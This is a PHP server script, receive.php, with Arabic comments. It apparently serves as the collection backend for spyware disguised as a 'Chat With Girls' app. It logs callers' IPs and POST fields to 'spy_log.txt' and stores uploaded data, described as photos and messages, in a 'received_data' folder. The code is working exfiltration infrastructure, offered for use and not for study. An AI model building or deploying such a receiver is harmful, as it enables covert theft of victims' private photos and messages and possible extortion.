<?php
// receive.php - سيرفر استقبال بيانات التطبيق
header('Content-Type: text/plain; charset=utf-8');
date_default_timezone_set('Africa/Cairo');

// إعدادات التسجيل
$log_file = 'spy_log.txt';
$data_dir = 'received_data';

// أنشئ مجلد البيانات إذا لم يكن موجوداً
if (!file_exists($data_dir)) {
    mkdir($data_dir, 0777, true);
}

// سجل معلومات الطلب
$client_ip = $_SERVER['REMOTE_ADDR'];
$request_time = date('Y-m-d H:i:s');
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';

$log_entry = "=== طلب جديد ===\n";
$log_entry .= "الوقت: $request_time\n";
$log_entry .= "IP العميل: $client_ip\n";
$log_entry .= "المتصفح: $user_agent\n";
$log_entry .= "رابط الطلب: " . $_SERVER['REQUEST_URI'] . "\n";
$log_entry .= "طريقة الطلب: " . $_SERVER['REQUEST_METHOD'] . "\n";

// سجل بيانات POST إذا موجودة
if ($_POST) {
    $log_entry .= "بيانات POST:\n";
    foreach ($_POST as $key => $value) {
        $log_entry .= "  $key: " . substr($value, 0, 100) . "\n";
    }
}

$log_entry .= "================\n\n";

// إحفظ السجل
file_put_contents($log_file, $log_entry, FILE_APPEND);

// معالجة البيانات المستلمة
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $response = processPostData();
    echo $response;
} else {
    // إذا كان طلب GET، إظهر معلومات السيرفر
    showServerInfo();
}

function processPostData() {
    global $data_dir;
    
    if (isset($_POST['data_type']) && isset($_POST['data_content'])) {
        $data_type = $_POST['data_type'];
        $data_content = $_POST['data_content'];
        
        // تنظيف اسم الملف
        $clean_type = preg_replace('/[^a-zA-Z0-9_-]/', '_', $data_type);
        $timestamp = date('Y-m-d_H-i-s');
        
        // إسم الملف
        $filename = $data_dir . '/' . $clean_type . '_' . $timestamp . '.txt';
        
        // محتوى الملف
        $file_content = "نوع البيانات: $data_type\n";
        $file_content .= "وقت الاستلام: " . date('Y-m-d H:i:s') . "\n";
        $file_content .= "IP المرسل: " . $_SERVER['REMOTE_ADDR'] . "\n";
        $file_content .= "=================================\n";
        $file_content .= $data_content . "\n";
        
        // حفظ البيانات
        if (file_put_contents($filename, $file_content)) {
            // سجل النجاح
            $success_log = "✅ تم استقبال وحفظ: $filename\n";
            file_put_contents('spy_log.txt', $success_log, FILE_APPEND);
            
            return "SUCCESS: تم استقبال وحفظ بيانات $data_type";
        } else {
            return "ERROR: فشل في حفظ البيانات";
        }
    } else {
        return "ERROR: بيانات ناقصة (يجب إرسال data_type و data_content)";
    }
}

function showServerInfo() {
    echo "=== سيرفر Chat With Girls ===\n\n";
    echo "✅ الحالة: شغال وجاهز لاستقبال البيانات\n";
    echo "🕒 الوقت: " . date('Y-m-d H:i:s') . "\n";
    echo "🌐 العنوان: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "\n";
    echo "📊 طريقة الإستخدام:\n";
    echo "   أرسل طلب POST يحتوي على:\n";
    echo "   - data_type: نوع البيانات (صور، رسائل، إلخ)\n";
    echo "   - data_content: محتوى البيانات\n";
    echo "\n📁 الملفات المحفوظة: received_data/\n";
    echo "📝 سجل الأحداث: spy_log.txt\n";
}

// إضافة سجل بنهاية المعالجة
$end_log = "⏹️ انتهى معالجة الطلب من $client_ip\n\n";
file_put_contents($log_file, $end_log, FILE_APPEND);
?>